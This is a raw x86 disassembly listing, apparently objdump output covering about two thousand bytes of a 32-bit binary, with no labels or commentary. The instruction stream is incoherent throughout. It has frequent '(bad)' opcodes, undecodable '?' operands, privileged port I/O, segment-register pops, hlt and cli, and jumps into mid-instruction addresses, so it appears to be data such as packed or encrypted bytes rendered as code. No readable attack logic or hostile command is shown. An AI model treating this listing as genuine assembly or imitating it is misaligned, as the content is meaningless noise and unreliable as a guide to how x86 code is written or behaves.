  404786:	repz adc edx,eax
  404789:	retf   0xdc22
  40478c:	xor    cl,ch
  40478e:	(bad)  
  40478f:	push   esi
  404790:	inc    WORD PTR [eax-0x48]
  404794:	aaa    
  404795:	pop    ebx
  404796:	dec    esi
  404797:	pop    ds
  404798:	adc    ah,BYTE PTR [edx]
  40479a:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40479b:	dec    ebx
  40479c:	mov    cl,0x87
  40479e:	stos   BYTE PTR es:[edi],al
  40479f:	arpl   cx,si
  4047a1:	push   ds
  4047a2:	fs dec edx
  4047a4:	scas   al,BYTE PTR es:[edi]
  4047a5:	mov    esp,0x1c6787ff
  4047aa:	adc    cl,BYTE PTR [ecx-0x14b3942b]
  4047b0:	sub    ah,ch
  4047b2:	lods   al,BYTE PTR ds:[esi]
  4047b3:	xchg   BYTE PTR [ecx+0x5e1cf634],dl
  4047b9:	leave  
  4047ba:	sub    ch,BYTE PTR [eax-0x363713e2]
  4047c0:	clc    
  4047c1:	pusha  
  4047c2:	mov    DWORD PTR [eax-0xf],edi
  4047c5:	jp     0x4047b6
  4047c7:	dec    ecx
  4047c8:	pop    edx
  4047c9:	add    DWORD PTR [ecx+0x54],ebp
  4047cc:	inc    esi
  4047cd:	in     al,dx
  4047ce:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4047cf:	mov    cl,0x9d
  4047d1:	sbb    eax,0xc20cabc
  4047d6:	ret    
  4047d7:	mov    ch,0x7f
  4047d9:	push   ebp
  4047da:	mov    eax,0xb387e0d5
  4047df:	pop    ds
  4047e0:	test   DWORD PTR [eax-0x41],esp
  4047e3:	mov    ebx,0x20ff0d90
  4047e8:	xor    cl,ah
  4047ea:	inc    esi
  4047eb:	pop    edx
  4047ec:	ins    BYTE PTR es:[edi],dx
  4047ed:	sub    BYTE PTR [ecx],bl
  4047ef:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4047f0:	jo     0x4047de
  4047f2:	jns    0x4047c7
  4047f4:	push   es
  4047f5:	xchg   edi,eax
  4047f6:	int    0xcd
  4047f8:	loope  0x404794
  4047fa:	mov    al,BYTE PTR [edx+0x59]
  4047fd:	or     BYTE PTR [edx+0x18da0c56],ch
  404803:	sbb    BYTE PTR [edi+0x57],bh
  404806:	pop    ds
  404807:	cmc    
  404808:	mov    ds:0x1ac98fe1,eax
  40480d:	sti    
  40480e:	enter  0x3089,0xc0
  404812:	xchg   edi,eax
  404813:	push   ebx
  404814:	pop    edx
  404815:	leave  
  404816:	stos   DWORD PTR es:[edi],eax
  404817:	mov    ebx,0xea90afe0
  40481c:	test   BYTE PTR [ebp-0x5c],dl
  40481f:	mov    al,ds:0xd98c1ebf
  404824:	retf   
  404825:	xor    dl,BYTE PTR [ecx+0x495c0218]
  40482b:	int    0x9e
  40482d:	mov    WORD PTR [ebx-0x2],fs
  404830:	mov    ebx,0x10a1a254
  404835:	lods   al,BYTE PTR ds:[esi]
  404836:	jb     0x40488a
  404838:	int3   
  404839:	in     eax,0x30
  40483b:	cmp    DWORD PTR [esi],edx
  40483d:	repz push edx
  40483f:	xchg   ecx,eax
  404840:	out    dx,al
  404841:	aad    0xb1
  404843:	cdq    
  404844:	fist   DWORD PTR [ecx]
  404846:	and    eax,0x8eaa4433
  40484b:	pop    ds
  40484c:	adc    dl,al
  40484e:	mov    esi,0xae4fb93e
  404853:	jno    0x4047e2
  404855:	and    al,0x7a
  404857:	lahf   
  404858:	sub    eax,0x365cb8c9
  40485d:	push   eax
  40485e:	add    BYTE PTR ds:0x9eb6eb5b,0x15
  404865:	dec    ebp
  404866:	mov    dh,0x7a
  404868:	push   es
  404869:	sub    al,0xa7
  40486b:	jbe    0x4048cf
  40486d:	xor    ch,BYTE PTR [ebx-0x5]
  404870:	adc    al,cl
  404872:	aad    0x5c
  404874:	retf   
  404875:	ret    0x9eee
  404878:	sub    eax,DWORD PTR [eax-0x5c]
  40487b:	xchg   DWORD PTR [esi+ebp*2-0x5bfd7941],ebp
  404882:	fs inc edx
  404884:	or     eax,0x9defedb8
  404889:	xor    DWORD PTR [eax+eiz*2+0x73],ecx
  40488d:	adc    eax,0xa84123c9
  404892:	ds call 0xa73599b0
  404898:	sar    BYTE PTR [edx+eax*8+0x1ba820e9],cl
  40489f:	jmp    0x4048e2
  4048a1:	shl    BYTE PTR [ebp+eax*4-0x6c],cl
  4048a5:	loop   0x40491d
  4048a7:	push   0x43a594e4
  4048ac:	rcr    BYTE PTR [edx-0x45],0x85
  4048b0:	jb     0x40488f
  4048b2:	jnp    0x40492f
  4048b4:	xchg   BYTE PTR [eax+0x44],ch
  4048b7:	push   0x70455657
  4048bc:	test   al,0xd8
  4048be:	push   esp
  4048bf:	mov    bl,0xd3
  4048c1:	mov    bh,0xfd
  4048c3:	hlt    
  4048c4:	cs scas al,BYTE PTR es:[edi]
  4048c6:	bound  ecx,QWORD PTR [edi+0x22]
  4048c9:	dec    edi
  4048ca:	(bad)  
  4048cb:	(bad)  
  4048cc:	or     edx,DWORD PTR ds:[edi-0x43d903a2]
  4048d3:	sbb    eax,0x15338cbe
  4048d8:	in     eax,dx
  4048d9:	dec    esi
  4048da:	mov    edi,0xe329f1c2
  4048df:	inc    ebx
  4048e0:	dec    edx
  4048e1:	and    BYTE PTR [ecx-0x5b],ch
  4048e4:	icebp  
  4048e5:	pop    edx
  4048e6:	aas    
  4048e7:	xchg   esi,eax
  4048e8:	mov    ebp,DWORD PTR [ecx-0x76]
  4048eb:	and    esi,DWORD PTR [edi]
  4048ed:	mov    ds:0xe61faa78,eax
  4048f2:	and    bh,dh
  4048f4:	mov    ah,0xeb
  4048f6:	sbb    al,ch
  4048f8:	and    eax,0x4acc6cfe
  4048fd:	push   ss
  4048fe:	jno    0x40496b
  404900:	inc    esp
  404901:	pop    ebx
  404902:	xchg   edx,eax
  404903:	nop
  404904:	inc    edx
  404905:	aad    0xd5
  404907:	fstp   QWORD PTR [ebx+esi*1-0x1c5e89f2]
  40490e:	neg    DWORD PTR [esi]
  404910:	shl    BYTE PTR [ebp+0x6e],0x27
  404914:	cmp    eax,0xb7167f
  404919:	add    al,dh
  40491b:	dec    ecx
  40491c:	int3   
  40491d:	mov    fs,ebp
  40491f:	add    al,0x5f
  404921:	aaa    
  404922:	add    ch,al
  404924:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  404925:	add    DWORD PTR [ebx-0x36d613e9],edi
  40492b:	fwait
  40492c:	xor    BYTE PTR [edx-0x13ae270],dh
  404932:	mov    bl,0x54
  404934:	hlt    
  404935:	cmp    ebp,DWORD PTR [ecx*8-0x1285443d]
  40493c:	stos   BYTE PTR es:[edi],al
  40493d:	sub    dl,BYTE PTR [eax-0x17]
  404940:	fild   WORD PTR [ecx-0x59]
  404943:	mov    BYTE PTR [eax-0x49d01e83],al
  404949:	jb     0x40493d
  40494b:	or     al,0xbf
  40494d:	ret    
  40494e:	inc    eax
  40494f:	and    edx,esi
  404951:	stos   BYTE PTR es:[edi],al
  404952:	jo     0x404993
  404954:	jle    0x4049ad
  404956:	bound  eax,QWORD PTR [ecx+esi*2+0x58]
  40495a:	mov    esp,0x582fd3e3
  40495f:	ret    0x712f
  404962:	mov    ebx,0x441eaf60
  404967:	jecxz  0x4048ec
  404969:	push   0x2d
  40496b:	aam    0x8c
  40496d:	stos   BYTE PTR es:[edi],al
  40496e:	bound  ebx,QWORD PTR [ebp-0x6a]
  404971:	repnz xchg esp,eax
  404973:	loope  0x4049b9
  404975:	ins    DWORD PTR es:[edi],dx
  404976:	pminub mm5,QWORD PTR [edi-0x2a]
  40497a:	xchg   DWORD PTR [ebx],ebx
  40497c:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40497d:	push   ss
  40497e:	out    dx,al
  40497f:	cmp    cl,ah
  404981:	cmp    ebx,ecx
  404983:	adc    eax,0x8d71cf1e
  404988:	xchg   ebp,eax
  404989:	fdiv   QWORD PTR [ecx+0x3]
  40498c:	(bad)  
  40498e:	pop    ecx
  40498f:	lahf   
  404990:	jmp    0x404944
  404992:	lahf   
  404993:	repnz (bad) 
  404995:	hlt    
  404996:	mov    ecx,0x1e6902ca
  40499b:	fist   DWORD PTR [edx+0x3c6e904d]
  4049a1:	cmp    eax,0x739cdbba
  4049a6:	mov    eax,0xa02708ca
  4049ab:	bound  eax,QWORD PTR [esi]
  4049ad:	cdq    
  4049ae:	cmp    eax,ebx
  4049b0:	and    BYTE PTR [edi+0x31ce6515],dh
  4049b6:	mov    BYTE PTR [ecx+0xa],ah
  4049b9:	cwde   
  4049ba:	daa    
  4049bb:	pop    eax
  4049bc:	and    ah,BYTE PTR [ebx+0x41]
  4049bf:	mov    es,WORD PTR [ecx-0x48]
  4049c2:	pusha  
  4049c3:	xor    al,0x90
  4049c5:	sub    DWORD PTR [ebx-0x77],edi
  4049c8:	or     cl,BYTE PTR [esi]
  4049ca:	dec    ebp
  4049cb:	add    al,0xe2
  4049cd:	push   esi
  4049ce:	push   cs
  4049cf:	out    dx,eax
  4049d0:	xlat   BYTE PTR ds:[ebx]
  4049d1:	mov    esp,0x52e38210
  4049d6:	rcl    BYTE PTR [edx+edx*2],cl
  4049d9:	mov    ds:0x2c3ef015,eax
  4049de:	bound  ebx,QWORD PTR [esi]
  4049e0:	sub    BYTE PTR [eax],0x22
  4049e3:	mov    BYTE PTR [ecx+0x67b52b1b],cl
  4049e9:	inc    esi
  4049ea:	adc    dl,BYTE PTR ds:0x8124c3e3
  4049f0:	out    0xea,eax
  4049f2:	pop    esp
  4049f3:	jnp    0x404a1c
  4049f5:	jl     0x4049ea
  4049f7:	call   0x38a7:0xa73fe529
  4049fe:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4049ff:	add    DWORD PTR [ebp-0x7],ecx
  404a02:	jnp    0x404a14
  404a04:	push   edx
  404a05:	mov    eax,0xae259753
  404a0a:	xchg   edi,eax
  404a0b:	(bad)  
  404a0c:	outs   dx,DWORD PTR ds:[esi]
  404a0d:	mov    ebx,0x896711b3
  404a12:	sbb    esp,0x51
  404a15:	or     BYTE PTR [ecx],dh
  404a17:	test   al,0x6e
  404a19:	loop   0x404a8a
  404a1b:	hlt    
  404a1c:	adc    BYTE PTR [eax],ah
  404a1e:	mov    BYTE PTR [ecx-0x51],bl
  404a21:	ds js  0x4049bc
  404a24:	data16 add al,bl
  404a27:	ror    BYTE PTR [ebx-0x703908a5],0xc0
  404a2e:	nop
  404a2f:	sti    
  404a30:	jecxz  0x4049bf
  404a32:	xchg   ecx,eax
  404a33:	pusha  
  404a34:	inc    eax
  404a35:	outs   dx,BYTE PTR ds:[esi]
  404a36:	push   ebp
  404a37:	or     edi,DWORD PTR [ebp+0x19]
  404a3a:	push   cs
  404a3b:	(bad)  
  404a3c:	fimul  WORD PTR [esi-0x4b]
  404a3f:	xor    edi,DWORD PTR [ecx-0x29319898]
  404a45:	jae    0x404a27
  404a47:	pop    ebp
  404a48:	sbb    ah,BYTE PTR [edx]
  404a4a:	mov    ebp,0xcec166c6
  404a4f:	cmp    al,0xee
  404a51:	fist   DWORD PTR [ebx+0x39]
  404a54:	int3   
  404a55:	and    ebp,DWORD PTR [edx]
  404a57:	inc    ebp
  404a58:	jbe    0x404a9f
  404a5a:	arpl   WORD PTR [ebx-0x3bc3ee55],ax
  404a60:	shr    eax,1
  404a62:	cdq    
  404a63:	pop    esi
  404a64:	ins    BYTE PTR es:[edi],dx
  404a65:	js     0x404a76
  404a67:	fld    DWORD PTR [edi]
  404a69:	and    al,0x1
  404a6b:	jne    0x404a53
  404a6d:	js     0x404a09
  404a6f:	mov    dl,0x5b
  404a71:	stc    
  404a72:	mov    WORD PTR [edi-0x731d16cf],ds
  404a78:	test   al,0xb
  404a7a:	or     DWORD PTR [esi+eiz*1],esp
  404a7d:	das    
  404a7e:	js     0x404a9d
  404a80:	aas    
  404a81:	aam    0xf5
  404a83:	push   es
  404a84:	xchg   esp,eax
  404a85:	mov    esp,0x3b172b1c
  404a8a:	jmp    0x54bce00f
  404a8f:	clc    
  404a90:	push   eax
  404a91:	mov    edi,0x43f92d11
  404a96:	mov    esi,ds
  404a98:	aaa    
  404a99:	arpl   WORD PTR [edx+esi*4-0x262b6add],bp
  404aa0:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  404aa1:	aad    0xb
  404aa3:	sbb    eax,0xb8e2274d
  404aa8:	lahf   
  404aa9:	leave  
  404aaa:	cmp    eax,0x34183549
  404aaf:	mov    WORD PTR [edi-0x61ceeb71],?
  404ab5:	clc    
  404ab6:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  404ab7:	sbb    DWORD PTR [esi+0x2e],esi
  404aba:	add    eax,0x50963901
  404abf:	inc    edx
  404ac0:	fstp   TBYTE PTR [edi-0x36]
  404ac3:	mov    BYTE PTR [edx],0x10
  404ac6:	call   0x97f91883
  404acb:	scas   al,BYTE PTR es:[edi]
  404acc:	int    0xba
  404ace:	ror    ecx,0x1d
  404ad1:	dec    esp
  404ad2:	fist   DWORD PTR [edi+ebx*2]
  404ad5:	or     BYTE PTR [edx-0xe2be71c],bl
  404adb:	fwait
  404adc:	sti    
  404add:	cmp    BYTE PTR [ebx-0x75e9f26d],ah
  404ae3:	pop    es
  404ae4:	int3   
  404ae5:	gs cld 
  404ae7:	jb     0x404ab0
  404ae9:	jne    0x404ac2
  404aeb:	imul   ecx,DWORD PTR [ecx+0x23b595da],0x64
  404af2:	in     al,dx
  404af3:	cmp    BYTE PTR [edx],0x77
  404af6:	dec    ebp
  404af7:	sub    DWORD PTR [ebp-0x44],ecx
  404afa:	aaa    
  404afb:	dec    ebp
  404afd:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  404afe:	outs   dx,DWORD PTR ds:[esi]
  404aff:	and    bh,cl
  404b01:	test   al,0x44
  404b03:	je     0x404b7b
  404b05:	fild   QWORD PTR [eax]
  404b07:	arpl   WORD PTR [esi],bx
  404b09:	adc    BYTE PTR [esi+0x5521a2a1],al
  404b0f:	(bad)  
  404b11:	fs fadd st,st(7)
  404b14:	dec    eax
  404b15:	mov    dh,0x31
  404b17:	fld    DWORD PTR [edx-0x695d294e]
  404b1d:	and    eax,0x4219f4b8
  404b22:	aas    
  404b23:	daa    
  404b24:	xchg   edi,eax
  404b25:	pop    ebp
  404b26:	and    BYTE PTR [esi+0x59754239],ch
  404b2c:	inc    edx
  404b2d:	and    esp,ecx
  404b2f:	mul    DWORD PTR [esi+0x5af323c4]
  404b35:	add    edi,DWORD PTR [esp+edx*1]
  404b38:	jmp    0x404b98
  404b3a:	inc    edx
  404b3b:	add    BYTE PTR [ebx+0x449033a9],0x32
  404b42:	jnp    0x404b1d
  404b44:	aad    0xf8
  404b46:	inc    ebp
  404b47:	jp     0x404ae9
  404b49:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  404b4a:	mov    ch,0x97
  404b4c:	mov    dl,0xc2
  404b4e:	pop    edi
  404b4f:	dec    ebx
  404b50:	(bad)  
  404b51:	fld    QWORD PTR [ebx-0x31]
  404b54:	fidivr DWORD PTR [ecx+ebp*2-0x3620f2fc]
  404b5b:	mov    edx,0x552ed819
  404b60:	mov    al,BYTE PTR [eax]
  404b62:	fisub  WORD PTR [esi+0x36]
  404b65:	add    DWORD PTR [edi+0x1b0c2dce],ebx
  404b6b:	sbb    eax,0x41c1a733
  404b70:	pop    ss
  404b71:	adc    cl,BYTE PTR [edx+0x37]
  404b74:	int    0xd4
  404b76:	or     eax,0xd00fd5d0
  404b7b:	repz push esi
  404b7d:	jp     0x404b47
  404b7f:	dec    esp
  404b80:	fldz   
  404b82:	fnsave [edx-0x58]
  404b85:	cmp    BYTE PTR [edx+0x42c0a56b],0xb
  404b8c:	add    al,BYTE PTR [esi]
  404b8e:	popf   
  404b8f:	mov    esi,0x28459bdf
  404b94:	jnp    0x404bfe
  404b96:	sub    bl,BYTE PTR [eax]
  404b98:	mov    ds:0x64b1e31d,al
  404b9d:	test   dh,bh
  404b9f:	loope  0x404b35
  404ba1:	fs add al,0xf1
  404ba4:	jo     0x404be1
  404ba6:	ins    DWORD PTR es:[edi],dx
  404ba7:	jmp    0xff54d954
  404bac:	iret   
  404bad:	pop    es
  404bae:	data16 stc 
  404bb0:	mov    dh,0x89
  404bb2:	jmp    0x404b7f
  404bb4:	or     esi,esp
  404bb6:	ret    0xe9c5
  404bb9:	or     BYTE PTR ds:0x5e83979f,bh
  404bbf:	jno    0x404b72
  404bc1:	or     DWORD PTR [eax],ecx
  404bc3:	xchg   BYTE PTR [esi+0x5a],bl
  404bc6:	bound  esp,QWORD PTR [edi-0x59]
  404bc9:	lods   al,BYTE PTR ds:[esi]
  404bca:	and    edx,DWORD PTR [edi+0x4e]
  404bcd:	in     al,0x43
  404bcf:	mov    esp,0x806219ab
  404bd4:	add    eax,0x8ba362e0
  404bd9:	adc    BYTE PTR [edx+0x61],dl
  404bdc:	dec    edx
  404bdd:	int    0x47
  404bdf:	inc    edi
  404be0:	(bad)  
  404be1:	or     al,ch
  404be3:	inc    ebp
  404be4:	fwait
  404be5:	cwde   
  404be6:	and    eax,0xe0b4a62
  404beb:	sbb    DWORD PTR [ebp+edx*1-0x65],ecx
  404bef:	mov    edx,0xe2e81a98
  404bf4:	inc    edi
  404bf5:	ss pop ebx
  404bf7:	lds    edx,FWORD PTR [edx+0x79]
  404bfa:	sbb    al,0x11
  404bfc:	inc    edx
  404bfd:	mov    esi,0xf889696d
  404c02:	and    esi,DWORD PTR [ebp+eax*2-0x3abb03dc]
  404c09:	fiadd  WORD PTR [ecx+eiz*1+0x14734f7c]
  404c10:	cmp    ch,BYTE PTR [esi]
  404c12:	icebp  
  404c13:	add    ebx,DWORD PTR [edx+0x25]
  404c16:	cmp    eax,DWORD PTR [edx]
  404c18:	das    
  404c19:	jle    0x404bc6
  404c1b:	(bad)  
  404c1c:	dec    ecx
  404c1d:	ins    DWORD PTR es:[edi],dx
  404c1e:	and    cl,BYTE PTR [ebp-0x137f4423]
  404c24:	aad    0x7
  404c26:	fld    TBYTE PTR [ebp-0x5c90e72c]
  404c2c:	xchg   ecx,eax
  404c2d:	add    BYTE PTR [ecx-0x44],bh
  404c30:	mov    esi,0xb8899f3a
  404c35:	inc    ebx
  404c36:	jne    0x404c02
  404c38:	add    ebp,edi
  404c3a:	fnstenv [ecx]
  404c3c:	sbb    al,0xe2
  404c3f:	add    edi,DWORD PTR [edx]
  404c41:	cmp    BYTE PTR [edi+0x58b8f68a],dl
  404c47:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  404c48:	sar    BYTE PTR [edx+0x4b],0x17
  404c4c:	mov    al,bl
  404c4e:	shl    DWORD PTR [ecx],cl
  404c50:	in     al,0xba
  404c52:	push   ss
  404c53:	xor    BYTE PTR [ecx+esi*2-0x73],0x7
  404c58:	(bad)  
  404c59:	ss dec esp
  404c5b:	jg     0x404c30
  404c5d:	dec    edi
  404c5e:	loop   0x404bec
  404c60:	lods   eax,DWORD PTR ds:[esi]
  404c61:	mov    al,ds:0x389a4e3b
  404c66:	sbb    DWORD PTR [esi],ebx
  404c68:	sub    edx,DWORD PTR [ebx]
  404c6a:	cmp    BYTE PTR [ebx+0x7e],dl
  404c6d:	jl     0x404c73
  404c6f:	add    eax,0x75595ecb
  404c74:	mov    ?,WORD PTR [esi-0x47]
  404c77:	shr    DWORD PTR [ebx+0x2f],cl
  404c7a:	adc    al,0x93
  404c7c:	cmp    bh,BYTE PTR [edx-0x627f50ab]
  404c82:	sahf   
  404c83:	jne    0x404ceb
  404c85:	out    dx,eax
  404c86:	dec    ebp
  404c87:	inc    ebp
  404c88:	outs   dx,DWORD PTR ds:[esi]
  404c89:	mul    DWORD PTR [edi+0x68]
  404c8c:	add    BYTE PTR [esi],dl
  404c8e:	and    eax,esi
  404c90:	cmovno ebx,DWORD PTR [edx+0x18]
  404c94:	pop    ds
  404c95:	cdq    
  404c96:	mul    BYTE PTR [ebx]
  404c98:	sbb    BYTE PTR [ebx-0x42187246],0x3d
  404c9f:	inc    ebx
  404ca0:	adc    ah,0x54
  404ca3:	nop
  404ca4:	adc    eax,DWORD PTR [ebx+0x71]
  404ca7:	ror    dl,cl
  404ca9:	sub    esp,ebx
  404cab:	inc    ebp
  404cac:	inc    ebp
  404cad:	ss xor edi,eax
  404cb0:	cmp    esi,ebx
  404cb2:	jl     0x404ccf
  404cb4:	(bad)  
  404cb5:	xchg   esi,eax
  404cb6:	pop    ecx
  404cb7:	push   ss
  404cb8:	aaa    
  404cb9:	fisttp DWORD PTR [edx+eiz*8]
  404cbc:	es mov dl,0xf3
  404cbf:	push   edi
  404cc0:	cmp    eax,0x1045db6a
  404cc5:	jne    0x404ce8
  404cc7:	ror    BYTE PTR [esi],0xdd
  404cca:	mov    ch,cl
  404ccc:	pslld  mm4,QWORD PTR [eax]
  404ccf:	ret    0x6e50
  404cd2:	imul   ebx,edi,0x9a3d6a52
  404cd8:	sub    bh,bh
  404cda:	fcomip st,st(4)
  404cdc:	out    0x29,eax
  404cde:	adc    al,bl
  404ce0:	or     eax,0x1f54e451
  404ce5:	and    dl,bh
  404ce7:	inc    esi
  404ce8:	jnp    0x404cc9
  404cea:	ret    
  404ceb:	sbb    BYTE PTR ss:[ecx+edx*8+0x73a4e8e1],ch
  404cf3:	lods   al,BYTE PTR ds:[esi]
  404cf4:	(bad)  
  404cf5:	or     ebx,DWORD PTR [edi-0x4dfd83de]
  404cfb:	and    edx,ebx
  404cfd:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  404cfe:	out    dx,al
  404cff:	out    0x85,eax
  404d01:	inc    ecx
  404d02:	outs   dx,DWORD PTR ds:[esi]
  404d03:	cdq    
  404d04:	adc    DWORD PTR fs:[eax],edi
  404d07:	pop    ss
  404d08:	add    al,0xe1
  404d0a:	mov    edi,ebx
  404d0c:	push   ebp
  404d0d:	push   ebx
  404d0e:	mov    WORD PTR [eax-0x5f],ds
  404d11:	mov    DWORD PTR [eax+0x57],0xe32ad8d4
  404d18:	out    0x7e,al
  404d1a:	push   cs
  404d1b:	stos   BYTE PTR es:[edi],al
  404d1c:	fnstenv [esi+0x55]
  404d1f:	jns    0x404d90
  404d21:	push   ecx
  404d22:	inc    esp
  404d23:	sti    
  404d24:	(bad)  
  404d25:	mov    cl,0x62
  404d27:	retf   0x7fea
  404d2a:	outs   dx,DWORD PTR ds:[esi]
  404d2b:	inc    esi
  404d2c:	push   ss
  404d2d:	xor    DWORD PTR [edi],ebp
  404d2f:	or     BYTE PTR [ebx+0x141c70c6],bh
  404d35:	sbb    BYTE PTR [edi],0xb8
  404d38:	bound  edi,QWORD PTR [edx+0x47d89e96]
  404d3e:	xchg   esp,eax
  404d3f:	jl     0x404d2c
  404d41:	cdq    
  404d42:	jns    0x404dae
  404d44:	aas    
  404d45:	(bad)  [edi]
  404d47:	mov    eax,ds:0xe0453bd8
  404d4c:	push   esi
  404d4d:	pop    edi
  404d4e:	xchg   BYTE PTR [ebp+0x44ae372a],bl
  404d54:	jg     0x404d57
  404d56:	and    esp,DWORD PTR [ebp-0xe]
  404d59:	adc    BYTE PTR [edi+0x58],dh
  404d5c:	jb     0x404d92
  404d5e:	lods   eax,DWORD PTR ds:[esi]
  404d5f:	sahf   
  404d60:	std    
  404d61:	or     esp,DWORD PTR [esi-0x66a037e0]
  404d67:	pop    ss
  404d68:	dec    edx
  404d69:	fistp  WORD PTR ds:0xe479775e
  404d6f:	mov    eax,0x6f3fa1f5
  404d74:	cmp    edx,esp
  404d76:	int    0xa8
  404d78:	xor    eax,0xcc3fc831
  404d7d:	(bad)  
  404d7e:	mov    ch,0x89
  404d80:	lock imul ebp,esp,0xc703dbe0
  404d87:	pop    ecx
  404d88:	stos   BYTE PTR es:[edi],al
  404d89:	push   ecx
  404d8a:	in     al,0x94
  404d8c:	pusha  
  404d8d:	dec    edi
  404d8e:	xor    ebp,DWORD PTR [edi+esi*2]
  404d91:	or     esi,DWORD PTR [edi+0x3]
  404d94:	jo     0x404daf
  404d96:	add    al,0xdd
  404d98:	xor    esi,DWORD PTR [esi+0x49]
  404d9b:	add    ebp,0x8e8969e3
  404da1:	mov    ebx,0x2ab4de59
  404da6:	hlt    
  404da7:	loop   0x404d42
  404da9:	addr16 dec edx
  404dab:	jle    0x404def
  404dad:	shl    BYTE PTR [ebx+eiz*2-0x79],0x11
  404db2:	stos   DWORD PTR es:[edi],eax
  404db3:	dec    edi
  404db4:	fmulp  st(1),st
  404db6:	lock dec eax
  404db8:	jp     0x404d64
  404dba:	daa    
  404dbb:	cmp    ch,BYTE PTR [esi-0x68de9b9e]
  404dc1:	jno    0x404e40
  404dc3:	xor    BYTE PTR [esi+0x38],cl
  404dc6:	imul   ebp,DWORD PTR [edx+edx*1-0x6be634fa],0xf527ed43
  404dd1:	outs   dx,DWORD PTR ds:[esi]
  404dd2:	jp     0x404df5
  404dd4:	or     ch,BYTE PTR [edi-0x40]
  404dd7:	fxch   st(2)
  404dd9:	data16 mov dh,0x5f
  404ddc:	xor    al,0x37
  404dde:	mov    ds:0xde332d3,al
  404de3:	sbb    bh,0x12
  404de6:	mov    ds:0x26a8f44f,eax
  404deb:	push   0x1a
  404ded:	mov    cl,0x8e
  404def:	cs mov dh,0x38
  404df2:	pop    ebp
  404df3:	push   0x9582327c
  404df8:	xor    dl,BYTE PTR [ecx+0x50]
  404dfb:	inc    edx
  404dfc:	and    al,0xf9
  404dfe:	pop    esp
  404dff:	push   ebx
  404e00:	inc    ebp
  404e01:	pop    esp
  404e02:	enter  0x377c,0x2d
  404e06:	mov    cl,0x6
  404e08:	dec    ebp
  404e09:	pop    es
  404e0a:	and    ebp,ebx
  404e0c:	cmp    ch,BYTE PTR [edx-0x501b2094]
  404e12:	aaa    
  404e13:	bound  edi,QWORD PTR [eax+eiz*1-0x6e7165c7]
  404e1a:	mov    dh,0xc
  404e1c:	inc    edx
  404e1d:	lods   al,BYTE PTR ds:[esi]
  404e1e:	xor    al,0x89
  404e20:	mov    ebx,ebx
  404e22:	les    eax,FWORD PTR [edi]
  404e24:	pusha  
  404e25:	shr    cl,1
  404e27:	adc    bl,BYTE PTR [edi]
  404e29:	adc    BYTE PTR [eax-0x46],0xe1
  404e2d:	push   DWORD PTR [eax+0x74]
  404e30:	sbb    BYTE PTR [ebp+0x18],dh
  404e33:	inc    edx
  404e34:	(bad)  
  404e35:	clc    
  404e36:	pop    esp
  404e37:	lahf   
  404e38:	sar    DWORD PTR [edx+0x4b],1
  404e3b:	jecxz  0x404e75
  404e3d:	imul   edx,DWORD PTR ss:[edi],0x8fe324b7
  404e44:	enter  0xf75d,0x7e
  404e48:	mov    eax,ds:0xb4324917
  404e4d:	add    DWORD PTR [edi+0x8],esp
  404e50:	push   es
  404e51:	pop    ds
  404e52:	fsubr  QWORD PTR [edx-0x1a]
  404e55:	cdq    
  404e56:	fldenv [ecx-0xc]
  404e59:	inc    ebx
  404e5a:	pop    ds
  404e5b:	hlt    
  404e5c:	mov    ?,esp
  404e5e:	cli    
  404e5f:	mov    bl,0x3d
  404e61:	retf   
  404e62:	cmp    edi,edx
  404e64:	dec    eax
  404e65:	xor    eax,0x5cbd87b5
  404e6a:	shr    DWORD PTR [ecx+0x58acaf74],0x7e
  404e71:	or     eax,0x2316fe45
  404e76:	rol    BYTE PTR [eax],cl
  404e78:	ficomp WORD PTR [eax-0x1a]
  404e7b:	cld    
  404e7c:	push   esp
  404e7d:	ret    0x21b5
  404e80:	test   DWORD PTR [ecx+ebx*1-0xa],edi
  404e84:	repnz imul ebp,DWORD PTR [esp+ebp*4],0xffffffe2
  404e89:	mov    cl,0x22
  404e8b:	mov    edi,0x828280e8
  404e90:	dec    esp
  404e91:	cmp    ah,BYTE PTR ds:0xfb2ffef5
  404e97:	out    dx,al
  404e98:	icebp  
  404e99:	sub    al,BYTE PTR [edi]
  404e9b:	or     DWORD PTR [esi+edx*4],eax
  404e9e:	imul   esp,ecx,0x1c
  404ea1:	xor    eax,0xc7dd634
  404ea6:	mov    BYTE PTR [ebp+0x6e],dl
  404ea9:	aad    0x12
  404eab:	out    0xdc,eax
  404ead:	dec    esp
  404eae:	test   BYTE PTR ds:0x14fa43c5,ch
  404eb4:	pop    ebx
  404eb5:	pop    edi
  404eb6:	xchg   esi,eax
  404eb7:	jne    0x404ef9
  404eb9:	ins    BYTE PTR es:[edi],dx
  404eba:	aad    0x45
  404ebc:	mov    ds:0x89c479d9,al
  404ec1:	stc    
  404ec2:	and    bl,BYTE PTR [ebp-0x28]
  404ec5:	sub    dh,cl
  404ec7:	add    DWORD PTR [esi-0x5b],0x64
  404ecb:	sub    BYTE PTR [edi],bh
  404ecd:	xchg   edx,eax
  404ece:	stos   DWORD PTR es:[edi],eax
  404ecf:	fwait
  404ed0:	repnz cmp eax,0x14e46173
  404ed6:	pop    edx
  404ed7:	lods   al,BYTE PTR ds:[esi]
  404ed8:	adc    DWORD PTR [edi+esi*1+0x88056e4],0xffffffe7
  404ee0:	arpl   WORD PTR [ebx-0x1cad8c24],di
  404ee6:	mov    eax,ds:0x677b1549
  404eeb:	cmp    edi,DWORD PTR [edi]
  404eed:	adc    BYTE PTR [ebx],cl
  404eef:	mov    dh,0xea
  404ef1:	fwait
  404ef2:	ja     0x404efb
  404ef4:	mov    ah,0xde
  404ef6:	arpl   WORD PTR [ecx+0x4dbdf04a],bx
  404efc:	enter  0x6e44,0x8c
  404f00:	jg     0x404f16
  404f02:	cmp    DWORD PTR [esp+edi*1-0x62],edx
  404f06:	inc    ebx
  404f07:	inc    ebp
  404f08:	inc    edi
  404f09:	mov    cl,0x71
